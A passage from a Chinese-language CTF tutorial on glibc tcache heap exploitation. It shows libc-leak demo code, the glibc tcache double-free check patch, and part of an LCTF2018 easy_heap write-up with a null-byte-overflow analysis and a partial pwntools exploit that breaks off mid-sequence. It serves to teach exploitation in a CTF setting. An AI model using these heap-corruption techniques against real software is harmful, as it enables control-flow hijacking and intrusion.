<h4 id="smallbin-unlink">smallbin unlink<a class="headerlink" href="#smallbin-unlink" title="Permanent link">&para;</a></h4>
<p>在smallbin中包含有空闲块的时候，会同时将同大小的其他空闲块，放入tcache中，此时也会出现解链操作，但相比于unlink宏，缺少了链完整性校验。因此，原本unlink操作在该条件下也可以使用。</p>
<h4 id="libc-leak">libc leak<a class="headerlink" href="#libc-leak" title="Permanent link">&para;</a></h4>
<p>在以前的libc 版本中，我们只需这样：</p>
<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">long</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="p">}</span> 
</pre></div>

<p>但是在2.26 之后的 libc 版本后，我们首先得先把tcache 填满：</p>
<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span> <span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="kt">long</span><span class="o">*</span> <span class="n">t</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
    <span class="kt">long</span> <span class="o">*</span><span class="n">a</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="kt">long</span> <span class="o">*</span><span class="n">b</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>

    <span class="c1">// make tcache bin full</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">7</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">7</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">free</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
    <span class="c1">// a is put in an unsorted bin because the tcache bin of this size is full</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="p">}</span> 
</pre></div>

<p>之后，我们就可以 leak libc 了。</p>
<div class="codehilite"><pre><span></span>gdb-peda$ heapinfo
<span class="o">(</span>0x20<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">0</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x30<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">1</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x40<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">2</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x50<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">3</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x60<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">4</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x70<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">5</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x80<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">6</span><span class="o">]</span>: 0x0
<span class="o">(</span>0x90<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">7</span><span class="o">]</span>: 0x0
<span class="o">(</span>0xa0<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">8</span><span class="o">]</span>: 0x0
<span class="o">(</span>0xb0<span class="o">)</span>     fastbin<span class="o">[</span><span class="m">9</span><span class="o">]</span>: 0x0
                  top: 0x555555559af0 <span class="o">(</span>size : 0x20510<span class="o">)</span>
       last_remainder: 0x0 <span class="o">(</span>size : 0x0<span class="o">)</span>
            unsortbin: 0x555555559250 <span class="o">(</span>size : 0x110<span class="o">)</span>
<span class="o">(</span>0x110<span class="o">)</span>   tcache_entry<span class="o">[</span><span class="m">15</span><span class="o">]</span>: 0x5555555599f0 --&gt; 0x5555555598e0 --&gt; 0x5555555597d0 --&gt; 0x5555555596c0 --&gt; 0x5555555595b0 --&gt; 0x5555555594a0 --&gt; 0x555555559390
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk
0x555555559000      0x0                 0x250                Used                None              None
0x555555559250      0x0                 0x110                Freed     0x7ffff7fc0ca0    0x7ffff7fc0ca0
0x555555559360      0x110               0x20                 Used                None              None
0x555555559380      0x0                 0x110                Used                None              None
0x555555559490      0x0                 0x110                Used                None              None
0x5555555595a0      0x0                 0x110                Used                None              None
0x5555555596b0      0x0                 0x110                Used                None              None
</pre></div>

<h3 id="0x04-tcache-check">0x04 Tcache Check<a class="headerlink" href="#0x04-tcache-check" title="Permanent link">&para;</a></h3>
<p>在最新的 libc 的<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=f730d7a2ee496d365bf3546298b9d19b8bddc0d0;hp=6d7a6a8cabb4edbf00881cb7503473a8ed4ec0b7;hb=bcdaad21d4635931d1bd3b54a7894276925d081d;hpb=5770c0ad1e0c784e817464ca2cf9436a58c9beb7">commit</a> 中更新了 Tcache 的 double free 的check：</p>
<div class="codehilite"><pre><span></span><span class="n">index</span> <span class="mi">6</span><span class="n">d7a6a8</span><span class="p">..</span><span class="n">f730d7a</span> <span class="mi">100644</span> <span class="p">(</span><span class="n">file</span><span class="p">)</span>
<span class="o">---</span> <span class="n">a</span><span class="o">/</span><span class="n">malloc</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
<span class="o">+++</span> <span class="n">b</span><span class="o">/</span><span class="n">malloc</span><span class="o">/</span><span class="n">malloc</span><span class="p">.</span><span class="n">c</span>
<span class="err">@@</span> <span class="o">-</span><span class="mi">2967</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">2967</span><span class="p">,</span><span class="mi">8</span> <span class="err">@@</span> <span class="n">mremap_chunk</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">p</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">new_size</span><span class="p">)</span>
 <span class="k">typedef</span> <span class="k">struct</span> <span class="n">tcache_entry</span>
 <span class="p">{</span>
   <span class="k">struct</span> <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
<span class="o">+</span>  <span class="cm">/* This field exists to detect double frees.  */</span>
<span class="o">+</span>  <span class="k">struct</span> <span class="n">tcache_perthread_struct</span> <span class="o">*</span><span class="n">key</span><span class="p">;</span>
 <span class="p">}</span> <span class="n">tcache_entry</span><span class="p">;</span>

 <span class="cm">/* There is one of these for each thread, which contains the</span>
<span class="cm">@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx)</span>
<span class="cm"> {</span>
<span class="cm">   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span>
<span class="cm">   assert (tc_idx &lt; TCACHE_MAX_BINS);</span>
<span class="cm">+</span>
<span class="cm">+  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span>
<span class="cm">+     detect a double free.  */</span>
<span class="o">+</span>  <span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="n">tcache</span><span class="p">;</span>
<span class="o">+</span>
   <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
   <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
   <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
<span class="err">@@</span> <span class="o">-</span><span class="mi">3005</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">3012</span><span class="p">,</span><span class="mi">7</span> <span class="err">@@</span> <span class="n">tcache_get</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
   <span class="n">assert</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
   <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
   <span class="o">--</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
<span class="o">+</span>  <span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
   <span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">e</span><span class="p">;</span>
 <span class="p">}</span>

<span class="err">@@</span> <span class="o">-</span><span class="mi">4218</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">4226</span><span class="p">,</span><span class="mi">26</span> <span class="err">@@</span> <span class="n">_int_free</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">,</span> <span class="kt">int</span> <span class="n">have_lock</span><span class="p">)</span>
   <span class="p">{</span>
     <span class="kt">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="n">csize2tidx</span> <span class="p">(</span><span class="n">size</span><span class="p">);</span>

<span class="o">+</span>    <span class="cm">/* Check to see if it&#39;s already in the tcache.  */</span>
<span class="o">+</span>    <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
<span class="o">+</span>
<span class="o">+</span>    <span class="cm">/* This test succeeds on double free.  However, we don&#39;t 100%</span>
<span class="cm">+       trust it (it also matches random payload data at a 1 in</span>
<span class="cm">+       2^&lt;size_t&gt; chance), so verify it&#39;s not an unlikely coincidence</span>
<span class="cm">+       before aborting.  */</span>
<span class="o">+</span>    <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">==</span> <span class="n">tcache</span> <span class="o">&amp;&amp;</span> <span class="n">tcache</span><span class="p">))</span>
<span class="o">+</span>      <span class="p">{</span>
<span class="o">+</span>       <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
<span class="o">+</span>       <span class="n">LIBC_PROBE</span> <span class="p">(</span><span class="n">memory_tcache_double_free</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
<span class="o">+</span>       <span class="k">for</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
<span class="o">+</span>            <span class="n">tmp</span><span class="p">;</span>
<span class="o">+</span>            <span class="n">tmp</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span>
<span class="o">+</span>         <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">==</span> <span class="n">e</span><span class="p">)</span>
<span class="o">+</span>           <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&quot;free(): double free detected in tcache 2&quot;</span><span class="p">);</span>
<span class="o">+</span>       <span class="cm">/* If we get here, it was a coincidence.  We&#39;ve wasted a few</span>
<span class="cm">+          cycles, but don&#39;t abort.  */</span>
<span class="o">+</span>      <span class="p">}</span>
<span class="o">+</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span>
        <span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_bins</span>
        <span class="o">&amp;&amp;</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span><span class="p">)</span>
</pre></div>

<p>目前为止，只看到了在 free 操作的时候的 check ，似乎没有对 get 进行新的check。</p>
<h3 id="0x05-the-pwn-of-ctf">0x05 The pwn of CTF<a class="headerlink" href="#0x05-the-pwn-of-ctf" title="Permanent link">&para;</a></h3>
<h4 id="challenge-1-lctf2018-pwn-easy_heap">Challenge 1 : LCTF2018 PWN easy_heap<a class="headerlink" href="#challenge-1-lctf2018-pwn-easy_heap" title="Permanent link">&para;</a></h4>
<h5 id="_1">基本信息<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h5>
<p>远程环境中的 libc 是 libc-2.27.so ，所以堆块申请释放过程中需要考虑 Tcache 。</p>
<div class="codehilite"><pre><span></span>zj@zj-virtual-machine:~/c_study/lctf2018/easy$ checksec ./easy_heap
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/zj/c_study/lctf2018/easy/easy_heap&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</pre></div>

<h5 id="_2">基本功能<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h5>
<p>程序通过在 heap 上的一块内存( size 为 0xb0 )管理申请的堆块的头地址和我们想要写入堆块的字节数 ，总共可以申请 10 个固定大小为 0x100 的 chunk 来存放我们写入的信息 ，程序具备 show 的功能 ，可以打印堆块中的内容 ，另外程序具备删除堆块功能 ，选择删除 chunk 会先把 chunk 中的内存覆盖成 '\0' ，然后再执行 free 函数 。</p>
<p>程序的读入输入函数存在一个 null-byte-one 漏洞 ，具体见如下代码</p>
<div class="codehilite"><pre><span></span><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">read_input</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">malloc_p</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sz</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-Ch]</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>

  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                                        
  <span class="k">if</span> <span class="p">(</span> <span class="n">sz</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">malloc_p</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">1uLL</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">sz</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="n">i</span> <span class="o">||</span> <span class="o">!</span><span class="n">malloc_p</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">||</span> <span class="n">malloc_p</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="o">++</span><span class="n">i</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">malloc_p</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">malloc_p</span><span class="p">[</span><span class="n">sz</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                           <span class="c1">// null-byte-one</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="o">*</span><span class="n">malloc_p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v4</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<h5 id="_3">利用思路<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h5>
<p>通常来讲在堆程序中出现 null-byte-one 漏洞 ，都会考虑构造 overlapping heap chunk ，使得 overlapping chunk 可以多次使用 ，达到信息泄露最终劫持控制流的目的 。</p>
<p>本题没有办法直接更改 prev_size 这一字段为 0x200 0x300 类似的值 ，所以传统上直接在几个 chunks 中间夹一个 chunk 然后 free 掉更高地址的 chunk 触发向低地址合并的方法得到大的 unsortedbin chunk 的方法在此处并不适用 。</p>
<p>所以如果我们要实现 leak ，我们仍然需要把 main_arena 相关的地址写到一个可以 show 的 chunk 里面 。这里提供一种方法 ，先连续申请 10 个 chunk(size 0x100) ，然后连续释放 7 个 chunk ，刚好可以填满一个 tcache bin 。</p>
<p>然后再连续释放剩下 3 个 chunk ，这 3 个 chunk 便可以进入 unsortedbin ，注意到进入 unsortedbin 的 3 个 chunk 中的第二个 chunk 的 fd ，bk 上的值 ，就会发现把第二个 chunk 作为后面我们要 unlink 掉的 target chunk 是合适的 。</p>
<p>单独看上面的思路有点抽象 ，接下来跟着具体的 exp 来理解这个过程 ，就会比较自然 。</p>
<h5 id="_4">操作过程<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h5>
<ul>
<li>exp 的函数定义部分</li>
</ul>
<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">local</span> <span class="o">=</span> <span class="bp">True</span>
<span class="k">if</span> <span class="n">local</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./easy_heap&#39;</span><span class="p">)</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;LD_PRELOAD&#39;</span><span class="p">:</span> <span class="s1">&#39;./libc64.so&#39;</span><span class="p">})</span>

<span class="c1"># aggressive alias</span>
<span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rud</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">se</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sel</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">pick32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">x</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">))</span>
<span class="n">pick64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">x</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">))</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc64.so&#39;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">sz</span><span class="p">,</span> <span class="n">pay</span><span class="p">):</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
    <span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
    <span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">sz</span><span class="p">))</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
    <span class="n">se</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
    <span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
    <span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">puts</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
    <span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
    <span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
</pre></div>

<ul>
<li>先申请 10 块 chunk ，再全部释放掉</li>
</ul>
<p>kong1 表示 heap 上数组 arr 存第一个 chunk 信息的位置 <strong>空</strong> 闲出来了 ( 存 chunk 地址的位置值变成 NULL ，存 size 的位置值也为 0 ) ，所以数组 arr 中的一个位置实际上占用的是 0x10 个字节</p>
<div class="codehilite"><pre><span></span>    <span class="c1"># The 10 chunks for the first application are contiguous. We numbered the chunks for the first application id0 ~ id9 so that we could track them later.</span>
    <span class="c1"># 0~9</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">248</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#0 id0</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">248</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#1 id1</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">248</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#2 id2</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">248</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#3 id3</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">248</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;4&#39;</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#4 id4</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">248</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;5&#39;</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#5 id5</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">248</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;6&#39;</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#6 id6</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">248</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;7&#39;</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#7 id7</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">248</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;8&#39;</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#8 id8</span>
    <span class="n">malloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">248</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;9&#39;</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#9 id9</span>

    <span class="c1"># fill tcache : need 7 chunk</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="c1">#kong 1</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="c1">#kong 3</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="c1">#kong 5</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="c1">#kong 6</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span> <span class="c1">#kong 7</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="c1">#kong 8</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="c1">#kong 9</span>

    <span class="c1">#place into the unso bk : 0 2 4</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">#kong 0</span>
